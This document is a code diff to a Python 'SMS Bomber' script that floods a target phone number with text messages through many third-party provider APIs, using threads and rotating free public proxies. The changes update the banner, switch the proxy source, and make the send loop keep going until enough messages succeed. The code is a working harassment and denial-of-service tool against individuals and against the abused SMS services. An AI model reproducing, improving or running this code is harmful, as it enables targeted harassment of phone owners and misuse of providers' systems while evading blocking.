@@ -24,17 +24,16 @@ import random
 import time
 
 ascii_art = r"""
- __   __     _        _                   _    _                    
- \ \ / /___ | |_     / \    _ __    ___  | |_ | |__    ___  _ __    
-  \ V // _ \| __|   / _ \  | '_ \  / _ \ | __|| '_ \  / _ \| '__|   
-   | ||  __/| |_   / ___ \ | | | || (_) || |_ | | | ||  __/| |      
-   |_| \___| \__| /_/   \_\|_| |_| \___/  \__||_| |_| \___||_|      
-  ____   __  __  ____    ____                     _                 
- / ___| |  \/  |/ ___|  | __ )   ___   _ __ ___  | |__    ___  _ __ 
- \___ \ | |\/| |\___ \  |  _ \  / _ \ | '_ ` _ \ | '_ \  / _ \| '__|
-  ___) || |  | | ___) | | |_) || (_) || | | | | || |_) ||  __/| |   
- |____/ |_|  |_||____/  |____/  \___/ |_| |_| |_||_.__/  \___||_|   
-                                                                    
+
+__   __     _        _               _    _
+\ \ / /___ | |_     /_\   _ _   ___ | |_ | |_   ___  _ _
+ \ V // -_)|  _|   / _ \ | ' \ / _ \|  _|| ' \ / -_)| '_|
+  |_| \___| \__|  /_/ \_\|_||_|\___/ \__||_||_|\___||_|
+ ___  __  __  ___    ___              _
+/ __||  \/  |/ __|  | _ ) ___  _ __  | |__  ___  _ _
+\__ \| |\/| |\__ \  | _ \/ _ \| '  \ | '_ \/ -_)| '_|
+|___/|_|  |_||___/  |___/\___/|_|_|_||_.__/\___||_|
+
 """
 
 parser = CustomArgumentParser(
@@ -61,7 +60,11 @@ parser.add_argument(
     "--num", "-N", type=int, help="Number of SMSs to send to TARGET.", default=30
 )
 parser.add_argument(
-    "--country", "-C", type=int, help="Country code without (+) sign.", default=91,
+    "--country",
+    "-C",
+    type=int,
+    help="Country code without (+) sign.",
+    default=91,
 )
 parser.add_argument(
     "--threads",
@@ -113,15 +116,14 @@ not args.verbose and not args.verify and print(
 
 
 # proxy setup
-# https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true
 def get_proxy():
     args.verbose and print("Fetching proxies from server.....")
-    curl = requests.get(
-        "https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true"
-    ).text
-    if "limit" in curl:
-        print("Proxy limitation error. Try without `-p` or `--proxy` argument")
-        exit()
+    curl = requests.get("http://pubproxy.com/api/proxy?format=txt").text
+    if "http://pubproxy.com/#premium" in curl:
+        args.verbose and print(
+            "Proxy limitation error, proceeding without a proxy now.."
+        )
+        return
     args.verbose and print(f"Using Proxy: {curl}")
     return {"http": curl, "https": curl}
 
@@ -144,16 +146,17 @@ def bomber(p):
         except:
             failed += 1
     not args.verbose and not args.verify and print(
-        f"Bombing : {success+failed}/{no_of_sms} | Success: {success} | Failed: {failed}",
+        f"Requests: {success+failed} | Success: {success} | Failed: {failed}",
         end="\r",
     )
-    if args.proxy and ((success + failed) // random.randint(5, 20)) == 0:
+    if args.proxy and ((failed) // random.randint(5, 10)) == 0:
+        global proxies
         proxies = get_proxy()
 
 
 # threadsssss
 start = time.time()
-providers = json.load(open(config, "r", encoding='UTF-8'))["providers"]
+providers = json.load(open(config, "r", encoding="UTF-8"))["providers"]
 if args.verify:
     pall = [p for x in providers.values() for p in x]
     print(f"Processing {len(pall)} providers, please wait!\n")
@@ -173,7 +176,7 @@ if args.verify:
             )
 else:
     with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
-        for _ in range(no_of_sms):
+        while success <= no_of_sms:
             p = APIRequestsHandler(
                 target,
                 proxy=proxies,
@@ -190,6 +193,8 @@ else:
 end = time.time()
 
 # finalize
-(args.verbose or args.verify) and print(f"\nSuccess: {success} | Failed: {failed}")
-not args.verbose and not args.verify and print()
+if args.verbose or args.verify:
+    print(f"\nSuccess: {success} | Failed: {failed}")
+else:
+    print()
 print(f"Took {end-start:.2f}s to complete")
